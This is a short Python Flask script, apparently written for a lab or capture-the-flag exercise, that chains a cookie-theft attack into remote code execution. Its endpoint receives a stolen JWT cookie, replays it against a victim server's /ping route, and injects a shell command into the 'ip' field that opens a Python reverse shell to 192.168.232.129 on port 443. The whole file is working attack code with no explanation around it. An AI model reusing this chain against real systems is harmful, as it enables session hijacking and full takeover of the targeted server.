from flask import Flask, request
import requests

# ejecutar:
#   export FLASK_APP=server_vuln.py
#   export FLASK_ENV=development
#   flask run --port=8000 --host=0.0.0.0

app = Flask(__name__)

ip_victima = '172.17.0.2'

@app.route('/envio_cookie', methods=['POST', 'GET'])
def envio_cookie():
    
    cookie = request.args.get('cookie').split('=')[1]

    print(cookie)

    cookies = {
        "JWT_token": cookie
    }   

    payload = "127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.232.129\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

    data = {
        "ip": payload
    }

    r = requests.post('http://{}:5000/ping'.format(ip_victima), cookies = cookies, data = data)

    print(r.text)

    return ""
